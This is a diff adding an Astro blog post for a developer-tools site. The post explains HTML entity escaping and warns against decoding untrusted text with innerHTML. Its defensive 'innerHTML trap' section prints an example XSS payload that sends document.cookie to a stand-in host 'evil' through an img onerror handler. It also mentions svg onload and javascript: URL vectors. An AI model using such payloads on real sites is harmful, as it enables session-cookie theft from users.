@@ -1,0 +1,84 @@
+---
+import Base from '../../layouts/Base.astro'
+import Layout from '../../components/Layout.astro'
+import BlogPostShell from '../../components/BlogPostShell.astro'
+import BlogToolEmbed from '../../components/BlogToolEmbed.astro'
+
+const slug = 'html-escape'
+const seo = {
+  title: 'How to escape HTML entities, and why innerHTML is the wrong way back | maratool',
+  description: 'Which five characters need escaping, how named, decimal, and hex entities differ, and why decoding with innerHTML hands an attacker script execution.',
+  canonical: `https://maratool.com/blog/${slug}`,
+  schema: {
+    '@context': 'https://schema.org',
+    '@type': 'BlogPosting',
+    headline: 'How to escape HTML entities, and why innerHTML is the wrong way back',
+    image: 'https://maratool.com/og/developer.png',
+    datePublished: '2026-08-15',
+    dateModified: '2026-08-15',
+    author: { '@type': 'Person', name: 'Marcell Almeida', url: 'https://marcell.com.br' },
+    publisher: {
+      '@type': 'Organization',
+      name: 'maratool',
+      url: 'https://maratool.com',
+      logo: { '@type': 'ImageObject', url: 'https://maratool.com/favicon.svg' },
+    },
+    mainEntityOfPage: { '@type': 'WebPage', '@id': `https://maratool.com/blog/${slug}` },
+    url: `https://maratool.com/blog/${slug}`,
+    description: 'HTML entity escaping and unescaping explained, including the innerHTML decoding trap.',
+  },
+  breadcrumbSchema: {
+    '@context': 'https://schema.org',
+    '@type': 'BreadcrumbList',
+    itemListElement: [
+      { '@type': 'ListItem', position: 1, name: 'Home', item: 'https://maratool.com' },
+      { '@type': 'ListItem', position: 2, name: 'Blog', item: 'https://maratool.com/blog' },
+      { '@type': 'ListItem', position: 3, name: 'HTML escape guide', item: `https://maratool.com/blog/${slug}` },
+    ],
+  },
+}
+---
+<Base {...seo}>
+  <Layout>
+    <BlogPostShell
+      title="How to escape HTML entities, and why innerHTML is the wrong way back"
+      lead="Five characters, three notations, and one decoding shortcut that quietly runs whatever an attacker pasted into your form."
+      date="August 15, 2026"
+      dateIso="2026-08-15"
+    >
+      <p>An HTML parser reading <code>&lt;script&gt;</code> in your page has to decide whether you meant a tag or the literal text. Escaping is how you tell it. Replace the character with a reference and the parser prints it instead of acting on it.</p>
+
+      <BlogToolEmbed slug="html-escape" title="Try it — paste markup on the left, entities on the right" height={620} />
+
+      <h2>How it works</h2>
+      <ol>
+        <li>Paste raw text or markup in the left pane and the escaped version appears on the right as you type.</li>
+        <li>Paste entity-encoded text in the right pane to go the other way. Named, decimal, and hexadecimal references all decode.</li>
+        <li>Tick the non-ASCII option to convert accents and emoji to numeric entities, useful when the target system is stuck on a legacy charset. Then copy either pane.</li>
+      </ol>
+
+      <h2>The five characters</h2>
+      <p>Only two are strictly required in element text. An ampersand starts a character reference, so a bare <code>&amp;</code> is ambiguous. A less-than sign starts a tag. The greater-than sign is escaped by convention, since a stray one can confuse older parsers and hand-written regex. Inside an attribute value, whichever quote delimits the attribute has to go too, and since you cannot always predict whether your string will land in a single-quoted or double-quoted attribute, escaping both is the safe default.</p>
+      <p>That is why the standard set is <code>&amp; &lt; &gt; &quot; &#39;</code>, and why the apostrophe is written as <code>&amp;#39;</code> rather than <code>&amp;apos;</code>. The named form only exists in XML and HTML5. Old parsers print it verbatim, which is exactly the bug you were escaping to avoid.</p>
+
+      <h2>Named, decimal, hex</h2>
+      <p>The copyright sign can be written three ways: <code>&amp;copy;</code>, <code>&amp;#169;</code>, or <code>&amp;#xA9;</code>. All produce the same character. Named entities read better but only about 250 of them exist in the HTML4 set that most content sticks to. Numeric references cover every Unicode code point, so anything outside the named list has to use them.</p>
+      <p>Real-world content mixes all three, usually because it passed through several systems. Scraped text also carries a fourth flavor: numeric references in the 128 to 159 range, such as <code>&amp;#151;</code>. Those code points are control characters in Unicode, but the reference almost always came from Windows-1252 text, where 151 is an em dash. Browsers remap that range on purpose, and so does the decoder here, so <code>&amp;#151;</code> comes out as the dash the author meant.</p>
+
+      <h2>The innerHTML trap</h2>
+      <p>The tempting way to decode entities in the browser is three lines:</p>
+      <pre><code>{`const el = document.createElement('div')
+el.innerHTML = untrustedText
+return el.textContent`}</code></pre>
+      <p>It works. It also parses <code>untrustedText</code> as HTML on the way in. A payload of <code>&lt;img src=x onerror=fetch(&#39;//evil&#39;+document.cookie)&gt;</code> triggers the error handler the moment the assignment runs, before you ever read <code>textContent</code> back. Detaching the element from the document does not help: image loading, and therefore <code>onerror</code>, does not require attachment. Neither does a <code>&lt;svg onload&gt;</code>. Inline scripts happen not to run this way, which is what makes the pattern look safe in a quick test.</p>
+      <p>The version without a parser is not much longer. Match <code>&amp;name;</code> against a lookup table, match <code>&amp;#digits;</code> and <code>&amp;#xhex;</code> with a regular expression, and call <code>String.fromCodePoint</code> after checking the value is a legal scalar. That is what this tool does. No markup is ever constructed, so nothing can execute. If you do want the browser to do the work, <code>new DOMParser().parseFromString(text, &#39;text/html&#39;)</code> is inert by spec. The <code>innerHTML</code> shortcut never was.</p>
+
+      <h2>Escaping is not sanitizing</h2>
+      <p>Entity escaping protects HTML text and quoted attribute values. It does nothing for the contexts that do not use HTML syntax. Inside a <code>&lt;script&gt;</code> block you need JavaScript string escaping. Inside <code>style</code> you need CSS escaping. An unquoted attribute can be escaped from with a plain space. And a <code>href</code> holding <code>javascript:alert(1)</code> contains no special characters at all, so escaping leaves it perfectly intact and perfectly dangerous.</p>
+      <p>The rule that covers all of them: escape at the point of output, in whatever escaping that output needs, instead of once on the way into the database.</p>
+
+      <hr class="blog-divider" />
+      <p class="blog-footer-note">The <a href="/html-escape/">HTML escape and unescape tool</a> runs in your browser with no network calls. To check what your markup renders as, use the <a href="/html-preview/">HTML preview</a>. More at <a href="/developer/">maratool.com/developer</a>.</p>
+    </BlogPostShell>
+  </Layout>
+</Base>
